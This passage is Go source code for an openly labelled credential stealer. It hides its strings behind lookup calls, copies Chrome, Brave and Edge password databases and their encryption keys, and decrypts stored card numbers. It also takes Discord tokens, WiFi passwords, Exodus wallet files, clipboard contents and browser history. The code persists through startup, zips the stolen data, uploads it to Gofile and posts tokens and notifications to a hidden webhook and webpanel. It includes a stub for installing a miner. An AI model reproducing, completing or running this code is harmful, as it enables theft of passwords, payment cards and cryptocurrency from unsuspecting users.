			loginDataPath:  filepath.Join(localAppData, fetchEntry(31), fetchEntry(32), fetchEntry(28), fetchEntry(29), fetchEntry(108)),
		},
	}

	var allPasswords strings.Builder
	allPasswords.WriteString("=== Browser Passwords (Encrypted DBs) ===\n")
	allPasswords.WriteString("\n")
	allPasswords.WriteString("Note: Passwords are encrypted with Chrome App-Bound Encryption (ABE)\n")
	allPasswords.WriteString("Encrypted databases copied for offline decryption with ChromElevator\n")
	allPasswords.WriteString("\n")

	passwordCount := 0
	for browserName, paths := range browsers {
		// Check if Login Data exists
		if _, err := os.Stat(paths.loginDataPath); os.IsNotExist(err) {
			continue
		}

		allPasswords.WriteString(fmt.Sprintf("%s:\n", browserName))
		
		// Copy encrypted Login Data
		destLoginData := filepath.Join(tempDir, browserName+"_LoginData.db")
		if err := copyFile(paths.loginDataPath, destLoginData); err == nil {
			allPasswords.WriteString("  ✅ Login Data copied\n")
			
			// Also copy Local State (contains encryption key)
			destLocalState := filepath.Join(tempDir, browserName+"_LocalState.json")
			if err := copyFile(paths.localStatePath, destLocalState); err == nil {
				allPasswords.WriteString("  ✅ Local State (key) copied\n")
			} else {
				allPasswords.WriteString("  ⚠️  Local State not found\n")
			}
			
			passwordCount++
		} else {
			allPasswords.WriteString("  ❌ Failed to copy\n")
		}
	}
	
	if passwordCount > 0 {
		allPasswords.WriteString(fmt.Sprintf("\nTotal: %d browser databases collected\n", passwordCount))
	}

	// Save passwords to file
	passwordsFile := filepath.Join(tempDir, fetchEntry(119))
	return ioutil.WriteFile(passwordsFile, []byte(allPasswords.String()), 0644)
}

// collectBrowserPayments extracts payment methods using Chrome ABE
func collectBrowserPayments(localAppData string, tempDir string) error {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover from any panic in browser payment collection
		}
	}()
	
	browsers := map[string]struct {
		localStatePath string
		webDataPath    string
	}{
		fetchEntry(27): { // Chrome
			localStatePath: filepath.Join(localAppData, fetchEntry(26), fetchEntry(27), fetchEntry(28), fetchEntry(107)),
			webDataPath:    filepath.Join(localAppData, fetchEntry(26), fetchEntry(27), fetchEntry(28), fetchEntry(29), fetchEntry(109)),
		},
		fetchEntry(63): { // Brave
			localStatePath: filepath.Join(localAppData, fetchEntry(33), fetchEntry(34), fetchEntry(28), fetchEntry(107)),
			webDataPath:    filepath.Join(localAppData, fetchEntry(33), fetchEntry(34), fetchEntry(28), fetchEntry(29), fetchEntry(109)),
		},
		fetchEntry(32): { // Edge
			localStatePath: filepath.Join(localAppData, fetchEntry(31), fetchEntry(32), fetchEntry(28), fetchEntry(107)),
			webDataPath:    filepath.Join(localAppData, fetchEntry(31), fetchEntry(32), fetchEntry(28), fetchEntry(29), fetchEntry(109)),
		},
	}

	var allPayments strings.Builder
	allPayments.WriteString(fetchEntry(134))
	allPayments.WriteString(fetchEntry(100))
	allPayments.WriteString(fetchEntry(100))
	allPayments.WriteString(fetchEntry(135))
	allPayments.WriteString(fetchEntry(100))
	allPayments.WriteString(fetchEntry(128))
	allPayments.WriteString(fetchEntry(100))
	allPayments.WriteString(fetchEntry(100))

	for browserName, paths := range browsers {
		// Check if Local State exists
		if _, err := os.Stat(paths.localStatePath); os.IsNotExist(err) {
			continue
		}

		// Check if Web Data exists
		if _, err := os.Stat(paths.webDataPath); os.IsNotExist(err) {
			continue
		}

		// Extract master key
		masterKey, err := extractMasterKey(paths.localStatePath, browserName)
		if err != nil {
			// Fallback: Copy encrypted DB
			allPayments.WriteString(fmt.Sprintf(fetchEntry(100), browserName))
			allPayments.WriteString(fetchEntry(100))
			
			destPath := filepath.Join(tempDir, browserName+fetchEntry(122))
			copyFile(paths.webDataPath, destPath)
			continue
		}

		// Copy Web Data to temp
		tempWebPath := filepath.Join(os.TempDir(), fmt.Sprintf(fetchEntry(124)+fetchEntry(100), time.Now().Unix())+fetchEntry(125))
		if err := copyFile(paths.webDataPath, tempWebPath); err != nil {
			continue
		}
		defer os.Remove(tempWebPath)

		// Read SQLite DB
		data, err := ioutil.ReadFile(tempWebPath)
		if err != nil {
			continue
		}

		allPayments.WriteString(fmt.Sprintf(fetchEntry(100), browserName))
		allPayments.WriteString(fmt.Sprintf(fetchEntry(136), browserName))

		// Search for v20-encrypted card number blobs
		v20Prefix := fetchEntry(114)
		cards := 0
		maxIterations := 50

		for i := 0; i < len(data)-50; i++ {
			if string(data[i:i+3]) == v20Prefix {
				if i+47 > len(data) {
					continue
				}

				// Try to decrypt card numbers (typically 16-19 digits)
				iterations := 0
				for blobLen := 47; blobLen <= 150 && i+blobLen <= len(data); blobLen++ {
					iterations++
					if iterations > maxIterations {
						break
					}
					
					if i+blobLen > len(data) {
						break
					}
					
					encBlob := data[i : i+blobLen]
					
					plaintext, err := decryptAESGCM(masterKey, encBlob)
					if err == nil && len(plaintext) >= 13 && len(plaintext) <= 23 {
						// Check if it's a card number (digits only or with spaces/dashes)
						isCardNumber := true
						digitCount := 0
						for _, b := range plaintext {
							if b >= '0' && b <= '9' {
								digitCount++
							} else if b != ' ' && b != '-' {
								isCardNumber = false
								break
							}
						}

						if isCardNumber && digitCount >= 13 && digitCount <= 19 {
							allPayments.WriteString(fmt.Sprintf(fetchEntry(137), string(plaintext)))
							cards++
							break
						}
					}
				}
			}
		}

		if cards == 0 {
			allPayments.WriteString(fetchEntry(138))
			allPayments.WriteString(fetchEntry(100))
		} else {
			allPayments.WriteString(fetchEntry(132))
			allPayments.WriteString(fmt.Sprintf(fetchEntry(61), cards))
			allPayments.WriteString(fetchEntry(139))
			allPayments.WriteString(fetchEntry(100))
		}
	}

	// Save payments to file
	paymentsFile := filepath.Join(tempDir, fetchEntry(120))
	return ioutil.WriteFile(paymentsFile, []byte(allPayments.String()), 0644)
}

func sendWebhook(webhook, token, platform string) {
	user := os.Getenv(fetchEntry(52))
	pc := os.Getenv(fetchEntry(51))

	payload := WebpanelPayload{
		Platform:     platform,
		Token:        token,
		Username:     user,
		ComputerName: pc,
	}
	jsonData, _ := json.Marshal(payload)

	req, _ := http.NewRequest(fetchEntry(103), webhook, bytes.NewBuffer(jsonData))
	req.Header.Set(fetchEntry(104), fetchEntry(105))

	client := &http.Client{Timeout: 10 * time.Second}
	client.Do(req)
	time.Sleep(500 * time.Millisecond)
}

func installMiner() {
	// Don't install miner - it causes crashes and complexity
	// The stealer data is already uploaded safely to Gofile
	// Miner can be deployed separately if needed
	return
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			// Log panic to file for debugging
			logFile := filepath.Join(os.TempDir(), "stealer_crash.log")
			crashMsg := fmt.Sprintf("PANIC: %v\n", r)
			ioutil.WriteFile(logFile, []byte(crashMsg), 0644)
		}
	}()

	// Check if already running
	if !checkMutex() {
		return
	}

	// Add to startup
	go addToStartup()

	webhook := decryptWebhook()
	found := make(map[string]bool)

	roaming := os.Getenv(fetchEntry(49))
	local := os.Getenv(fetchEntry(50))

	// Create temp directory for data collection
	tempDir, err := ioutil.TempDir("", fetchEntry(53))
	if err != nil {
		return
	}
	defer os.RemoveAll(tempDir)

	paths := map[string]string{
		fetchEntry(1): filepath.Join(roaming, fetchEntry(23)),
		fetchEntry(2): filepath.Join(roaming, fetchEntry(24)),
		fetchEntry(64): filepath.Join(roaming, fetchEntry(25)),
	}

	// Steal Discord tokens only
	for platform, path := range paths {
		if _, err := os.Stat(path); err == nil {
			for _, token := range scanPath(path, platform) {
				if !found[token] {
					found[token] = true
					sendWebhook(webhook, token, platform)
				}
			}
		}
	}

	// Collect WiFi passwords
	wifiPasswords := collectWiFiPasswords()
	if wifiPasswords != "" && len(wifiPasswords) > 50 {
		saveToFile(filepath.Join(tempDir, fetchEntry(54)), wifiPasswords)
	}

	// Collect Exodus Wallet data
	exodusData := collectExodusWallet(roaming)
	if exodusData != "" && len(exodusData) > 50 {
		saveToFile(filepath.Join(tempDir, fetchEntry(69)), exodusData)
		
		// Copy entire Exodus folder to temp for full extraction
		exodusPath := filepath.Join(roaming, fetchEntry(65))
		if _, err := os.Stat(exodusPath); err == nil {
			exodusBackupPath := filepath.Join(tempDir, fetchEntry(70))
			os.MkdirAll(exodusBackupPath, 0755)
			
			// Copy important Exodus files
			filesToCopy := []string{
				fetchEntry(66),
				fetchEntry(67),
				fetchEntry(68),
			}
			
			for _, fileName := range filesToCopy {
				srcFile := filepath.Join(exodusPath, fileName)
				if _, err := os.Stat(srcFile); err == nil {
					dstFile := filepath.Join(exodusBackupPath, fileName)
					copyFile(srcFile, dstFile)
				}
			}
			
			// Copy Local Storage folder (contains encrypted seeds)
			localStorageSrc := filepath.Join(exodusPath, fetchEntry(17))
			localStorageDst := filepath.Join(exodusBackupPath, fetchEntry(71))
			if _, err := os.Stat(localStorageSrc); err == nil {
				os.MkdirAll(localStorageDst, 0755)
				files, _ := ioutil.ReadDir(localStorageSrc)
				for _, file := range files {
					if !file.IsDir() {
						srcPath := filepath.Join(localStorageSrc, file.Name())
						dstPath := filepath.Join(localStorageDst, file.Name())
						copyFile(srcPath, dstPath)
					}
				}
			}
			
			// Copy leveldb folder
			leveldbSrc := filepath.Join(localStorageSrc, fetchEntry(18))
			leveldbDst := filepath.Join(localStorageDst, fetchEntry(18))
			if _, err := os.Stat(leveldbSrc); err == nil {
				os.MkdirAll(leveldbDst, 0755)
				files, _ := ioutil.ReadDir(leveldbSrc)
				for _, file := range files {
					if !file.IsDir() {
						srcPath := filepath.Join(leveldbSrc, file.Name())
						dstPath := filepath.Join(leveldbDst, file.Name())
						copyFile(srcPath, dstPath)
					}
				}
			}
		}
	}

	// Collect system info (detailed) - ALWAYS save this
	systemInfo := collectSystemInfo(len(found))
	if systemInfo != "" {
		saveToFile(filepath.Join(tempDir, fetchEntry(55)), systemInfo)
	}

	// Collect clipboard content
	clipboardContent := getClipboard()
	if clipboardContent != "" && len(clipboardContent) > 30 {
		saveToFile(filepath.Join(tempDir, fetchEntry(56)), clipboardContent)
	}

	// Collect installed software
	installedSoftware := getInstalledSoftware()
	if installedSoftware != "" && len(installedSoftware) > 50 {
		saveToFile(filepath.Join(tempDir, fetchEntry(57)), installedSoftware)
	}

	// Collect browser history (URLs only, no passwords)
	browserHistory := collectBrowserHistory(local)
	if browserHistory != "" && len(browserHistory) > 50 {
		saveToFile(filepath.Join(tempDir, fetchEntry(58)), browserHistory)
	}

	// Collect browser passwords using Chrome ABE
	collectBrowserPasswords(local, tempDir)
	
	// Collect browser payment methods using Chrome ABE
	collectBrowserPayments(local, tempDir)

	// Always create a summary file
	summaryContent := fmt.Sprintf("=== Data Collection Summary ===\n\nPC: %s\nUser: %s\nTime: %s\nTokens: %d\n",
		os.Getenv(fetchEntry(51)),
		os.Getenv(fetchEntry(52)),
		time.Now().Format("2006-01-02 15:04:05"),
		len(found))
	saveToFile(filepath.Join(tempDir, fetchEntry(59)), summaryContent)

	// Wait a bit to ensure all files are written
	time.Sleep(500 * time.Millisecond)

	// Count files for stats
	files, _ := ioutil.ReadDir(tempDir)
	fileCount := 0
	for _, f := range files {
		if !f.IsDir() {
			fileCount++
		}
	}

	// Create ZIP archive - even if only 1 file (summary.txt is guaranteed)
	if fileCount > 0 {
		zipPath, err := createZipArchive(tempDir)
		if err == nil && zipPath != "" {
			// Verify ZIP was created
			if zipInfo, err := os.Stat(zipPath); err == nil && zipInfo.Size() > 0 {
				// Upload to Gofile
				gofileURL, err := uploadZipToGofile(zipPath)
				if err == nil && gofileURL != "" {
					// Send notification to webpanel with Gofile link
					sendZipNotificationToWebpanel(
						gofileURL,
						os.Getenv(fetchEntry(51)),
						os.Getenv(fetchEntry(52)),
						fileCount,
					)
					
					// Install miner in background - won't block stealer exit
					// Even if miner fails, stealer data is already uploaded
					go installMiner()
				}
			}
		}
	}
}
